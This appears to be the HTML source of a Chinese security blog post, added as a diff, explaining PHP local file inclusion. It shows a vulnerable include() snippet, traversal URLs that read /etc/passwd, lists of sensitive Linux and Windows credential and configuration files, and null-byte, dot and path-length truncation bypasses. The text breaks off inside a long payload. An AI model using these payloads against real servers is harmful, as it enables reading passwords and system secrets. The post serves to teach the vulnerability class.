@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="YYK">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="YYK">
+    
+    <meta name="keywords" content="YYK,Cyber Security,网络安全">
+    
+    <meta name="description" content="">
+    <meta name="description" content="文件包含漏洞分类本地文件包含（LFI）原因服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。类似于java里的继承，语言里的调用，并且对于传参过滤不严，例如以下代码。 1234&lt;?php    $filename  &#x3D; $_GET[&#39;filename&#39;];    include($filename);?&gt; 其中，$_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含">
+<meta property="og:url" content="http://y-y-k.tk/2020/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+<meta property="og:site_name" content="YYK&#39;s blog">
+<meta property="og:description" content="文件包含漏洞分类本地文件包含（LFI）原因服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。类似于java里的继承，语言里的调用，并且对于传参过滤不严，例如以下代码。 1234&lt;?php    $filename  &#x3D; $_GET[&#39;filename&#39;];    include($filename);?&gt; 其中，$_">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190617213659994.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190617213740849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190617213810232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190617213917170.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190617213926600.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190617213936829.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190617213951538.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190617214024175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2020-03-15T03:02:28.331Z">
+<meta property="article:modified_time" content="2020-03-15T03:06:01.947Z">
+<meta property="article:author" content="YYK">
+<meta property="article:tag" content="web漏洞总结">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190617213659994.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <link rel="alternate" href="/atom.xml" title="YYK&#39;s Blog" type="application/atom+xml">
+    
+    <title>文件包含 · YYK&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/logo_favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >YYK&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">文件包含</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>YYK's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            文件包含
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web漏洞总结">web漏洞总结</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "文件包含">文件包含</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">3.4k</span>Reading time: <span class="post-count reading-time">16 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/03/15</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h1><h2 id="本地文件包含（LFI）"><a href="#本地文件包含（LFI）" class="headerlink" title="本地文件包含（LFI）"></a>本地文件包含（LFI）</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。类似于java里的继承，语言里的调用，并且对于传参过滤不严，例如以下代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>其中，$_GET[‘filename’]没有严格过滤参数，导致可以构造恶意参数，达到攻击目的</p>
+<h3 id="相关函数（php）"><a href="#相关函数（php）" class="headerlink" title="相关函数（php）"></a>相关函数（php）</h3><p>include()<br>include_once()<br>require()<br>require_once()<br><strong>区别：</strong><br>include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。<br>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>可这样构造来获取文件，例如<a href="http://127.0.0.1/flag.php" target="_blank" rel="noopener">http://127.0.0.1/flag.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php?file&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p>常见敏感目录：<br>linux</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</span><br></pre></td></tr></table></figure>
+<p>windows</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini &#x2F;&#x2F; 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件</span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码</span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php 配置信息</span><br></pre></td></tr></table></figure>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>%00截断（php&lt;5.3.4）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php?file&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br></pre></td></tr></table></figure>
+<p>点号截断（windows,点号位数大于256，php&lt;5.2.8）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php?file&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>
+<p>路径长度溢出截断（windows，点号位数需要长于256；linux长于4096，php&lt;5.2.8）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php?file&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x